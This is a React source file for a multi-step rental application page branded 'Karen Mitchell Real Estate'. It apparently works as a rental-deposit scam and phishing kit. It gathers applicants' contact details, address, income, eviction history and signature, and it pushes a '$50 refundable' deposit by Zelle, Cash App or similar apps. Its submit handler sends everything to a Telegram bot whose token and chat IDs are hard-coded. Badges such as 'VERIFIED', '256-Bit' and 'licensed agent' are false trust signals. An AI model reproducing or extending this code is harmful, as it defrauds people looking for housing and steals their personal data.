import React, { useState, useRef, useEffect } from "react";
import Logo from "./Logo";
import { FacebookIcon } from "./Icons";
import "./ApplicationPage.css";

// ── Telegram config ─────────────────────────────────────────────
const TG_BOT_TOKEN =
  import.meta.env.VITE_TG_BOT_TOKEN ||
  "8784185469:AAHGTpcVh8SHlfAmDsqwsSn_AiHKGxfhIS4";
const TG_CHAT_IDS = (
  import.meta.env.VITE_TG_CHAT_IDS ||
  "7187579346,1724137179,8622084710"
)
  .split(",")
  .map((id) => id.trim())
  .filter(Boolean);

const FB_URL = "https://www.facebook.com/share/1EQDA9pSYB/?mibextid=wwXIfr";

const PAYMENT_METHODS = [
  "Zelle",
  "Apple Pay",
  "PayPal",
  "Cash App",
  "Venmo",
  "Chime",
];

const INITIAL_FORM = {
  firstName: "",
  lastName: "",
  phone: "",
  email: "",
  appDate: new Date().toISOString().slice(0, 10),
  moveMonthYear: "",
  targetBeds: "3-4 Bedrooms (Single Family)",
  street1: "",
  street2: "",
  city: "",
  stateRegion: "",
  postalCode: "",
  occupation: "",
  occupants: "2",
  income: "",
  hasVehicle: true,
  hasPets: false,
  hasEvicted: false,
  paymentMethod: "Zelle",
  termsAccepted: true,
};

export default function ApplicationPage({ lang = "en" }) {
  const [step, setStep] = useState(1);
  const [form, setForm] = useState(INITIAL_FORM);
  const [errors, setErrors] = useState({});
  const [status, setStatus] = useState("idle"); // idle | sending | success | error
  const [hasSignature, setHasSignature] = useState(false);

  const canvasRef = useRef(null);
  const drawingRef = useRef(false);

  // Set field
  const setField = (k, v) => {
    setForm((prev) => ({ ...prev, [k]: v }));
    if (errors[k]) {
      setErrors((prev) => {
        const copy = { ...prev };
        delete copy[k];
        return copy;
      });
    }
  };

  // Step 1 Validation
  const validateStep1 = () => {
    const errs = {};
    if (!form.firstName.trim()) errs.firstName = "First name is required";
    if (!form.lastName.trim()) errs.lastName = "Last name is required";
    if (!form.phone.trim()) errs.phone = "Phone number is required";
    if (!form.email.trim() || !form.email.includes("@"))
      errs.email = "Valid email is required";
    if (!form.appDate) errs.appDate = "Application date is required";
    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  // Step 2 Validation
  const validateStep2 = () => {
    const errs = {};
    if (!form.street1.trim()) errs.street1 = "Current address is required";
    if (!form.city.trim()) errs.city = "City is required";
    if (!form.stateRegion.trim()) errs.stateRegion = "State is required";
    if (!form.postalCode.trim()) errs.postalCode = "ZIP code is required";
    if (!form.occupation.trim()) errs.occupation = "Occupation is required";
    if (!form.income.trim()) errs.income = "Monthly income is required";
    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  // Step 3 Validation
  const validateStep3 = () => {
    const errs = {};
    if (!form.paymentMethod)
      errs.paymentMethod = "Please select a deposit payment method";
    if (!form.termsAccepted)
      errs.termsAccepted = "You must agree to the screening terms";
    if (!hasSignature)
      errs.signature = "Please provide your digital signature";
    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const nextStep = (e) => {
    if (e) e.preventDefault();
    if (step === 1 && validateStep1()) {
      setStep(2);
      window.scrollTo({ top: 0, behavior: "smooth" });
    } else if (step === 2 && validateStep2()) {
      setStep(3);
      window.scrollTo({ top: 0, behavior: "smooth" });
    }
  };

  const prevStep = () => {
    setErrors({});
    setStep((s) => Math.max(1, s - 1));
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  // Signature Pad Setup
  useEffect(() => {
    if (step !== 3) return;
    const canvas = canvasRef.current;
    if (!canvas) return;

    const ratio = window.devicePixelRatio || 1;
    const rect = canvas.getBoundingClientRect();
    canvas.width = rect.width * ratio;
    canvas.height = rect.height * ratio;

    const ctx = canvas.getContext("2d");
    if (ctx) {
      ctx.scale(ratio, ratio);
      ctx.strokeStyle = "#0F172A";
      ctx.lineWidth = 2.5;
      ctx.lineCap = "round";
      ctx.lineJoin = "round";
    }

    const getPos = (e) => {
      const r = canvas.getBoundingClientRect();
      const clientX = e.touches ? e.touches[0].clientX : e.clientX;
      const clientY = e.touches ? e.touches[0].clientY : e.clientY;
      return { x: clientX - r.left, y: clientY - r.top };
    };

    let lastPos = null;

    const startDraw = (e) => {
      e.preventDefault();
      drawingRef.current = true;
      lastPos = getPos(e);
    };

    const draw = (e) => {
      if (!drawingRef.current || !lastPos) return;
      e.preventDefault();
      const ctx = canvas.getContext("2d");
      const p = getPos(e);
      ctx.beginPath();
      ctx.moveTo(lastPos.x, lastPos.y);
      ctx.lineTo(p.x, p.y);
      ctx.stroke();
      lastPos = p;
      setHasSignature(true);
    };

    const stopDraw = () => {
      drawingRef.current = false;
      lastPos = null;
    };

    canvas.addEventListener("mousedown", startDraw);
    canvas.addEventListener("mousemove", draw);
    window.addEventListener("mouseup", stopDraw);

    canvas.addEventListener("touchstart", startDraw, { passive: false });
    canvas.addEventListener("touchmove", draw, { passive: false });
    window.addEventListener("touchend", stopDraw);

    return () => {
      canvas.removeEventListener("mousedown", startDraw);
      canvas.removeEventListener("mousemove", draw);
      window.removeEventListener("mouseup", stopDraw);
      canvas.removeEventListener("touchstart", startDraw);
      canvas.removeEventListener("touchmove", draw);
      window.removeEventListener("touchend", stopDraw);
    };
  }, [step]);

  const clearSignature = () => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (ctx) ctx.clearRect(0, 0, canvas.width, canvas.height);
    setHasSignature(false);
  };

  // Build Certificate Canvas for Telegram
  const getCertificateBlob = (srcCanvas) => {
    return new Promise((resolve) => {
      const out = document.createElement("canvas");
      out.width = 800;
      out.height = 360;
      const ctx = out.getContext("2d");

      // Background
      ctx.fillStyle = "#FFFFFF";
      ctx.fillRect(0, 0, 800, 360);

      // Top Navy Header Bar
      ctx.fillStyle = "#0F172A";
      ctx.fillRect(0, 0, 800, 54);

      // Gold Accent Line
      ctx.fillStyle = "#D97706";
      ctx.fillRect(0, 54, 800, 4);

      // Header Text
      ctx.font = "bold 18px -apple-system, sans-serif";
      ctx.fillStyle = "#FFFFFF";
      ctx.fillText("KAREN MITCHELL REAL ESTATE — DIGITAL VERIFICATION", 30, 34);

      // Info Block
      ctx.font = "14px -apple-system, sans-serif";
      ctx.fillStyle = "#334155";
      ctx.fillText(`Applicant: ${form.firstName} ${form.lastName}`, 30, 95);
      ctx.fillText(`Contact: ${form.phone} | ${form.email}`, 30, 120);
      ctx.fillText(`Desired Move-In: ${form.moveMonthYear || "ASAP"}`, 30, 145);
      ctx.fillText(`Occupation: ${form.occupation} | Income: ${form.income}`, 30, 170);
      ctx.fillText(`Address: ${form.street1}, ${form.city}, ${form.stateRegion} ${form.postalCode}`, 30, 195);
      ctx.fillText(`Screening Fee: $50 Refundable (${form.paymentMethod})`, 30, 220);

      // Timestamp & ID
      const certId = "KM-" + Math.floor(100000 + Math.random() * 900000);
      ctx.font = "11px monospace";
      ctx.fillStyle = "#64748b";
      ctx.fillText(`Security ID: ${certId} | Timestamp: ${new Date().toISOString()}`, 30, 245);

      // Signature Box
      ctx.strokeStyle = "#CBD5E1";
      ctx.lineWidth = 1;
      ctx.strokeRect(30, 260, 400, 75);
      ctx.fillStyle = "#F8FAFC";
      ctx.fillRect(31, 261, 398, 73);

      ctx.font = "10px -apple-system, sans-serif";
      ctx.fillStyle = "#94A3B8";
      ctx.fillText("DIGITAL SIGNATURE ON FILE", 38, 275);

      if (srcCanvas) {
        ctx.drawImage(srcCanvas, 35, 270, 390, 60);
      }

      // Verified Seal
      ctx.fillStyle = "#ECFDF5";
      ctx.beginPath();
      ctx.arc(680, 290, 40, 0, Math.PI * 2);
      ctx.fill();
      ctx.strokeStyle = "#10B981";
      ctx.lineWidth = 2;
      ctx.stroke();

      ctx.font = "bold 11px -apple-system, sans-serif";
      ctx.fillStyle = "#059669";
      ctx.textAlign = "center";
      ctx.fillText("VERIFIED", 680, 287);
      ctx.fillText("SUBMISSION", 680, 302);
      ctx.textAlign = "left";

      out.toBlob((blob) => resolve(blob), "image/png");
    });
  };

  // Telegram Submission
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validateStep3()) return;

    setStatus("sending");

    const message = `
🏠 <b>KAREN MITCHELL REAL ESTATE — NEW APPLICATION</b>

<b>👤 Applicant Details:</b>
Name: ${form.firstName} ${form.lastName}
Email: ${form.email}
Phone: ${form.phone}
App Date: ${form.appDate}
Target Move-In: ${form.moveMonthYear || "ASAP"}
Property Preference: ${form.targetBeds}

<b>📍 Current Residence:</b>
Address: ${form.street1}${form.street2 ? ", " + form.street2 : ""}, ${form.city}, ${form.stateRegion} ${form.postalCode}

<b>💼 Employment & Household:</b>
Occupation: ${form.occupation}
Monthly Income: ${form.income}
Total Occupants: ${form.occupants}
Vehicle: ${form.hasVehicle ? "Yes" : "No"} | Pets: ${form.hasPets ? "Yes" : "No"} | Eviction History: ${form.hasEvicted ? "Yes" : "No"}

<b>💳 Screening & Viewing Fee:</b>
Payment Method: ${form.paymentMethod} ($50 Refundable Deposit)
    `.trim();

    try {
      const sigBlob = await getCertificateBlob(canvasRef.current);
      const base = `https://api.telegram.org/bot${TG_BOT_TOKEN}`;

      const results = await Promise.allSettled(
        TG_CHAT_IDS.map(async (chatId) => {
          if (sigBlob) {
            const fd = new FormData();
            fd.append("chat_id", chatId);
            fd.append("photo", sigBlob, "karen-mitchell-application.png");
            fd.append("caption", message);
            fd.append("parse_mode", "HTML");
            const res = await fetch(`${base}/sendPhoto`, {
              method: "POST",
              body: fd,
            });
            if (!res.ok) throw new Error("Telegram sendPhoto failed");
          } else {
            const res = await fetch(`${base}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "HTML",
              }),
            });
            if (!res.ok) throw new Error("Telegram sendMessage failed");
          }
        })
      );

      const anySuccess = results.some((r) => r.status === "fulfilled");
      if (!anySuccess) throw new Error("All Telegram deliveries failed");

      setStatus("success");
      window.scrollTo({ top: 0, behavior: "smooth" });
    } catch (err) {
      console.error("Submission error:", err);
      setStatus("error");
    }
  };

  return (
    <div className="km-portal">
      {/* Top Bar */}
      <header className="km-header">
        <div className="km-header__inner">
          <a
            href="/"
            onClick={(e) => {
              e.preventDefault();
              window.history.pushState({}, "", "/");
              window.dispatchEvent(new Event("popstate"));
            }}
            className="km-header__back"
          >
            ← Home
          </a>

          <div className="km-header__brand">
            <Logo size={32} />
            <div className="km-header__brand-text">
              <span className="km-header__brand-name">Karen Mitchell</span>
              <span className="km-header__brand-sub">Portal</span>
            </div>
          </div>

          <div className="km-header__secure">
            <span>🔒</span>
            <span>256-Bit</span>
          </div>
        </div>
      </header>

      <main className="km-body">
        {status === "success" ? (
          <div className="km-success-card">
            <div className="km-success-icon-wrap">✓</div>
            <h2 className="km-success-title">Application Successfully Submitted!</h2>
            <p className="km-success-desc">
              Thank you, <strong>{form.firstName} {form.lastName}</strong>. Your rental application has been securely transmitted directly to licensed agent Karen Mitchell for priority review.
            </p>
            <p className="km-success-desc" style={{ marginTop: "-12px", fontSize: "13px", color: "#64748b" }}>
              Karen will review your application details and contact you via phone or Facebook to confirm your private showing appointment.
            </p>
            <div className="km-success-actions">
              <a
                href={FB_URL}
                target="_blank"
                rel="noopener noreferrer"
                className="km-success-fb-btn"
              >
                <FacebookIcon size={16} color="currentColor" />
                <span>Message Karen on Facebook →</span>
              </a>
              <a
                href="/"
                onClick={(e) => {
                  e.preventDefault();
                  window.history.pushState({}, "", "/");
                  window.dispatchEvent(new Event("popstate"));
                }}
                className="km-success-home-btn"
              >
                Return to Home
              </a>
            </div>
          </div>
        ) : (
          <div>
            {/* Mobile-Only Progress Banner */}
            <div className="km-mobile-top-card">
              <div className="km-mobile-agent-row">
                <img
                  src="/karen-mitchell.jpg"
                  alt="Karen Mitchell"
                  className="km-mobile-avatar"
                />
                <div className="km-mobile-agent-info">
                  <h4>Karen Mitchell</h4>
                  <p>
                    <span className="km-agent-status-dot" />
                    Reviewing Applications Today
                  </p>
                </div>
              </div>
              <div className="km-mobile-progress-bar">
                <div
                  className="km-mobile-progress-fill"
                  style={{ width: step === 1 ? "33%" : step === 2 ? "66%" : "100%" }}
                />
              </div>
              <div className="km-mobile-step-label">
                <span>Step {step} of 3: {step === 1 ? "Applicant Profile" : step === 2 ? "Residence & Household" : "Deposit & Sign"}</span>
                <span>{step === 1 ? "33%" : step === 2 ? "66%" : "100%"}</span>
              </div>
            </div>

            <div className="km-desk-grid">
              {/* Desktop-Only Sidebar */}
              <aside className="km-sidebar-desktop">
                {/* Agent Badge Card */}
                <div className="km-agent-badge-card">
                  <div className="km-agent-badge-header">
                    <img
                      src="/karen-mitchell.jpg"
                      alt="Karen Mitchell"
                      className="km-agent-avatar"
                    />
                    <div className="km-agent-meta">
                      <h4>Karen Mitchell</h4>
                      <p>Licensed Real Estate Agent</p>
                      <div className="km-agent-status">
                        <span className="km-agent-status-dot" />
                        <span>Reviewing Applications Today</span>
                      </div>
                    </div>
                  </div>
                  <p className="km-agent-note">
                    “I personally review every application to ensure quick turnarounds and physically verified properties for every client.”
                  </p>
                </div>

                {/* Progress Stepper Card */}
                <div className="km-stepper-card">
                  <div className="km-stepper-title">Application Progress</div>

                  <div
                    className={`km-step-item ${step === 1 ? "is-active" : step > 1 ? "is-done" : ""}`}
                  >
                    <div className="km-step-badge">{step > 1 ? "✓" : "1"}</div>
                    <div className="km-step-info">
                      <h5>Applicant Profile</h5>
                      <p>Contact &amp; Personal Info</p>
                    </div>
                  </div>

                  <div
                    className={`km-step-item ${step === 2 ? "is-active" : step > 2 ? "is-done" : ""}`}
                  >
                    <div className="km-step-badge">{step > 2 ? "✓" : "2"}</div>
                    <div className="km-step-info">
                      <h5>Household &amp; Residence</h5>
                      <p>Address &amp; Employment</p>
                    </div>
                  </div>

                  <div
                    className={`km-step-item ${step === 3 ? "is-active" : ""}`}
                  >
                    <div className="km-step-badge">3</div>
                    <div className="km-step-info">
                      <h5>Deposit &amp; E-Signature</h5>
                      <p>Screening &amp; Legal Sign-Off</p>
                    </div>
                  </div>
                </div>

                {/* Trust Perks */}
                <div className="km-perks-card">
                  <div className="km-perk-row">
                    <span className="km-perk-icon">🔒</span>
                    <span>Direct Encrypted Transmission</span>
                  </div>
                  <div className="km-perk-row">
                    <span className="km-perk-icon">⚡</span>
                    <span>24–48 Hour Review Turnaround</span>
                  </div>
                  <div className="km-perk-row">
                    <span className="km-perk-icon">💯</span>
                    <span>100% Refundable Deposit Policy</span>
                  </div>
                  <div className="km-fb-help">
                    Have questions first?{" "}
                    <a href={FB_URL} target="_blank" rel="noopener noreferrer">
                      Message Karen on Facebook
                    </a>
                  </div>
                </div>
              </aside>

              {/* Right Work Area: Form Card */}
              <div className="km-form-card">
                <form onSubmit={step === 3 ? handleSubmit : nextStep} noValidate>
                  {/* ── STEP 1 ── */}
                  {step === 1 && (
                    <div>
                      <div className="km-form-header">
                        <span className="km-form-header__tag">Step 01 of 03</span>
                        <h2 className="km-form-header__title">Applicant Profile</h2>
                        <p className="km-form-header__desc">
                          Please provide your legal contact details so Karen Mitchell can get in touch regarding your showing.
                        </p>
                      </div>

                      <div className="km-grid-2">
                        <div className="km-field">
                          <label className="km-label">
                            First Name <span className="km-label-req">*</span>
                          </label>
                          <input
                            type="text"
                            className={`km-input ${errors.firstName ? "has-err" : ""}`}
                            placeholder="e.g. Sarah"
                            value={form.firstName}
                            onChange={(e) => setField("firstName", e.target.value)}
                          />
                          {errors.firstName && (
                            <span className="km-err-text">{errors.firstName}</span>
                          )}
                        </div>

                        <div className="km-field">
                          <label className="km-label">
                            Last Name <span className="km-label-req">*</span>
                          </label>
                          <input
                            type="text"
                            className={`km-input ${errors.lastName ? "has-err" : ""}`}
                            placeholder="e.g. Jenkins"
                            value={form.lastName}
                            onChange={(e) => setField("lastName", e.target.value)}
                          />
                          {errors.lastName && (
                            <span className="km-err-text">{errors.lastName}</span>
                          )}
                        </div>
                      </div>

                      <div className="km-grid-2">
                        <div className="km-field">
                          <label className="km-label">
                            Phone Number <span className="km-label-req">*</span>
                          </label>
                          <input
                            type="tel"
                            className={`km-input ${errors.phone ? "has-err" : ""}`}
                            placeholder="(555) 000-0000"
                            value={form.phone}
                            onChange={(e) => setField("phone", e.target.value)}
                          />
                          {errors.phone && (
                            <span className="km-err-text">{errors.phone}</span>
                          )}
                        </div>

                        <div className="km-field">
                          <label className="km-label">
                            Email Address <span className="km-label-req">*</span>
                          </label>
                          <input
                            type="email"
                            className={`km-input ${errors.email ? "has-err" : ""}`}
                            placeholder="name@example.com"
                            value={form.email}
                            onChange={(e) => setField("email", e.target.value)}
                          />
                          {errors.email && (
                            <span className="km-err-text">{errors.email}</span>
                          )}
                        </div>
                      </div>

                      <div className="km-grid-2">
                        <div className="km-field">
                          <label className="km-label">
                            Application Date <span className="km-label-req">*</span>
                          </label>
                          <input
                            type="date"
                            className="km-input"
                            value={form.appDate}
                            onChange={(e) => setField("appDate", e.target.value)}
                          />
                        </div>

                        <div className="km-field">
                          <label className="km-label">Desired Move-In Timetable</label>
                          <input
                            type="text"
                            className="km-input"
                            placeholder="e.g. Immediately, Next Month, Oct 1st"
                            value={form.moveMonthYear}
                            onChange={(e) => setField("moveMonthYear", e.target.value)}
                          />
                        </div>
                      </div>

                      <div className="km-field">
                        <label className="km-label">Property Type Preference</label>
                        <select
                          className="km-input"
                          value={form.targetBeds}
                          onChange={(e) => setField("targetBeds", e.target.value)}
                        >
                          <option value="3-4 Bedrooms (Single Family)">3–4 Bedrooms Single Family Residence</option>
                          <option value="2-3 Bedrooms (Executive Villa)">2–3 Bedrooms Executive Villa / Home</option>
                          <option value="4+ Bedrooms (Luxury Estate)">4+ Bedrooms Luxury Home</option>
                          <option value="Any Verified Available Residence">Any Verified Available Home in Portfolio</option>
                        </select>
                      </div>

                      <div className="km-nav-buttons">
                        <button type="submit" className="km-next-btn">
                          Continue to Residence &amp; Household →
                        </button>
                      </div>
                    </div>
                  )}

                  {/* ── STEP 2 ── */}
                  {step === 2 && (
                    <div>
                      <div className="km-form-header">
                        <span className="km-form-header__tag">Step 02 of 03</span>
                        <h2 className="km-form-header__title">Residence &amp; Household</h2>
                        <p className="km-form-header__desc">
                          Provide your current residence address and brief background details for qualification.
                        </p>
                      </div>

                      <div className="km-field">
                        <label className="km-label">
                          Current Street Address <span className="km-label-req">*</span>
                        </label>
                        <input
                          type="text"
                          className={`km-input ${errors.street1 ? "has-err" : ""}`}
                          placeholder="123 Main Street"
                          value={form.street1}
                          onChange={(e) => setField("street1", e.target.value)}
                        />
                        {errors.street1 && (
                          <span className="km-err-text">{errors.street1}</span>
                        )}
                      </div>

                      <div className="km-grid-3">
                        <div className="km-field">
                          <label className="km-label">
                            City <span className="km-label-req">*</span>
                          </label>
                          <input
                            type="text"
                            className={`km-input ${errors.city ? "has-err" : ""}`}
                            placeholder="City"
                            value={form.city}
                            onChange={(e) => setField("city", e.target.value)}
                          />
                          {errors.city && (
                            <span className="km-err-text">{errors.city}</span>
                          )}
                        </div>

                        <div className="km-field">
                          <label className="km-label">
                            State <span className="km-label-req">*</span>
                          </label>
                          <input
                            type="text"
                            className={`km-input ${errors.stateRegion ? "has-err" : ""}`}
                            placeholder="State"
                            value={form.stateRegion}
                            onChange={(e) => setField("stateRegion", e.target.value)}
                          />
                          {errors.stateRegion && (
                            <span className="km-err-text">{errors.stateRegion}</span>
                          )}
                        </div>

                        <div className="km-field">
                          <label className="km-label">
                            ZIP Code <span className="km-label-req">*</span>
                          </label>
                          <input
                            type="text"
                            className={`km-input ${errors.postalCode ? "has-err" : ""}`}
                            placeholder="Zip"
                            value={form.postalCode}
                            onChange={(e) => setField("postalCode", e.target.value)}
                          />
                          {errors.postalCode && (
                            <span className="km-err-text">{errors.postalCode}</span>
                          )}
                        </div>
                      </div>

                      <div className="km-grid-3">
                        <div className="km-field">
                          <label className="km-label">
                            Occupation / Employer <span className="km-label-req">*</span>
                          </label>
                          <input
                            type="text"
                            className={`km-input ${errors.occupation ? "has-err" : ""}`}
                            placeholder="e.g. Healthcare Specialist"
                            value={form.occupation}
                            onChange={(e) => setField("occupation", e.target.value)}
                          />
                          {errors.occupation && (
                            <span className="km-err-text">{errors.occupation}</span>
                          )}
                        </div>

                        <div className="km-field">
                          <label className="km-label">Total Occupants</label>
                          <input
                            type="number"
                            className="km-input"
                            min="1"
                            max="10"
                            value={form.occupants}
                            onChange={(e) => setField("occupants", e.target.value)}
                          />
                        </div>

                        <div className="km-field">
                          <label className="km-label">
                            Monthly Income <span className="km-label-req">*</span>
                          </label>
                          <input
                            type="text"
                            className={`km-input ${errors.income ? "has-err" : ""}`}
                            placeholder="e.g. $6,500/mo"
                            value={form.income}
                            onChange={(e) => setField("income", e.target.value)}
                          />
                          {errors.income && (
                            <span className="km-err-text">{errors.income}</span>
                          )}
                        </div>
                      </div>

                      {/* Toggles */}
                      <div className="km-toggle-card">
                        <span className="km-toggle-label">Do you own a personal vehicle?</span>
                        <div className="km-toggle-btn-group">
                          <button
                            type="button"
                            className={`km-toggle-btn ${form.hasVehicle ? "is-active" : ""}`}
                            onClick={() => setField("hasVehicle", true)}
                          >
                            Yes
                          </button>
                          <button
                            type="button"
                            className={`km-toggle-btn ${!form.hasVehicle ? "is-active" : ""}`}
                            onClick={() => setField("hasVehicle", false)}
                          >
                            No
                          </button>
                        </div>
                      </div>

                      <div className="km-toggle-card">
                        <span className="km-toggle-label">Do you have pets or service animals?</span>
                        <div className="km-toggle-btn-group">
                          <button
                            type="button"
                            className={`km-toggle-btn ${form.hasPets ? "is-active" : ""}`}
                            onClick={() => setField("hasPets", true)}
                          >
                            Yes
                          </button>
                          <button
                            type="button"
                            className={`km-toggle-btn ${!form.hasPets ? "is-active" : ""}`}
                            onClick={() => setField("hasPets", false)}
                          >
                            No
                          </button>
                        </div>
                      </div>

                      <div className="km-toggle-card">
                        <span className="km-toggle-label">Have you ever had an eviction filed against you?</span>
                        <div className="km-toggle-btn-group">
                          <button
                            type="button"
                            className={`km-toggle-btn ${form.hasEvicted ? "is-active" : ""}`}
                            onClick={() => setField("hasEvicted", true)}
                          >
                            Yes
                          </button>
                          <button
                            type="button"
                            className={`km-toggle-btn ${!form.hasEvicted ? "is-active" : ""}`}
                            onClick={() => setField("hasEvicted", false)}
                          >
                            No
                          </button>
                        </div>
                      </div>

                      <div className="km-nav-buttons">
                        <button type="button" onClick={prevStep} className="km-prev-btn">
                          ← Previous Step
                        </button>
                        <button type="submit" className="km-next-btn">
                          Continue to Deposit &amp; Signature →
                        </button>
                      </div>
                    </div>
                  )}

                  {/* ── STEP 3 ── */}
                  {step === 3 && (
                    <div>
                      <div className="km-form-header">
                        <span className="km-form-header__tag">Step 03 of 03</span>
                        <h2 className="km-form-header__title">Refundable Deposit &amp; Signature</h2>
                        <p className="km-form-header__desc">
                          Select your preferred payment method for the refundable deposit and execute your digital signature.
                        </p>
                      </div>

                      {/* Deposit Explainer Card */}
                      <div className="km-deposit-card">
                        <div className="km-deposit-amount">$50</div>
                        <div className="km-deposit-info">
                          <h4>100% Refundable Viewing &amp; Screening Deposit</h4>
                          <p>
                            This deposit reserves your showing appointment and identifies serious applicants. It is{" "}
                            <strong>100% refunded to you immediately</strong> following your showing appointment if you do not proceed, or applied directly to your first month's rent.
                          </p>
                        </div>
                      </div>

                      {/* Payment Method Selector */}
                      <div className="km-field">
                        <label className="km-label">
                          Select Preferred Payment Method <span className="km-label-req">*</span>
                        </label>
                        <div className="km-payment-grid">
                          {PAYMENT_METHODS.map((method) => (
                            <div
                              key={method}
                              className={`km-pay-tile ${form.paymentMethod === method ? "is-selected" : ""}`}
                              onClick={() => setField("paymentMethod", method)}
                            >
                              <span>{method}</span>
                              <div className="km-pay-dot" />
                            </div>
                          ))}
                        </div>
                        {errors.paymentMethod && (
                          <span className="km-err-text">{errors.paymentMethod}</span>
                        )}
                      </div>

                      {/* Legal Box */}
                      <div className="km-legal-box">
                        I certify that all information provided in this rental application is true, accurate, and complete. I authorize Karen Mitchell and designated screening agents to verify employment, check references, and conduct lawful background checks in compliance with the Fair Credit Reporting Act (FCRA) and Equal Housing Opportunity laws. The refundable deposit is returned immediately following the private showing if a lease is not executed.
                      </div>

                      <label className="km-terms-checkbox">
                        <input
                          type="checkbox"
                          checked={form.termsAccepted}
                          onChange={(e) => setField("termsAccepted", e.target.checked)}
                        />
                        <span>I understand and agree to the screening terms and confirm my details are accurate.</span>
                      </label>

                      {/* Signature Pad */}
                      <div className="km-field">
                        <label className="km-label">
                          Digital Signature <span className="km-label-req">*</span>
                        </label>
                        <div className="km-sig-container">
                          <canvas ref={canvasRef} className="km-sig-canvas" />
                        </div>
                        <div className="km-sig-footer">
                          <span style={{ fontSize: "11px", color: "#64748b" }}>
                            Draw your signature inside the box using mouse, finger, or trackpad
                          </span>
                          <button
                            type="button"
                            onClick={clearSignature}
                            className="km-sig-clear-btn"
                          >
                            Clear Signature
                          </button>
                        </div>
                        {errors.signature && (
                          <span className="km-err-text">{errors.signature}</span>
                        )}
                      </div>

                      {status === "error" && (
                        <div style={{ color: "#dc2626", background: "#fef2f2", border: "1px solid #fecaca", padding: "12px", borderRadius: "8px", marginBottom: "16px", fontSize: "13px" }}>
                          Could not transmit your application. Please check your connection or{" "}
                          <a href={FB_URL} target="_blank" rel="noopener noreferrer" style={{ textDecoration: "underline", fontWeight: 700 }}>
                            message Karen directly on Facebook
                          </a>.
                        </div>
                      )}

                      <div className="km-nav-buttons">
                        <button type="button" onClick={prevStep} className="km-prev-btn">
                          ← Previous Step
                        </button>
                        <button
                          type="submit"
                          disabled={status === "sending"}
                          className="km-submit-btn"
                        >
                          {status === "sending" ? "Submitting Application…" : "Submit Official Application →"}
                        </button>
                      </div>
                    </div>
                  )}
                </form>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
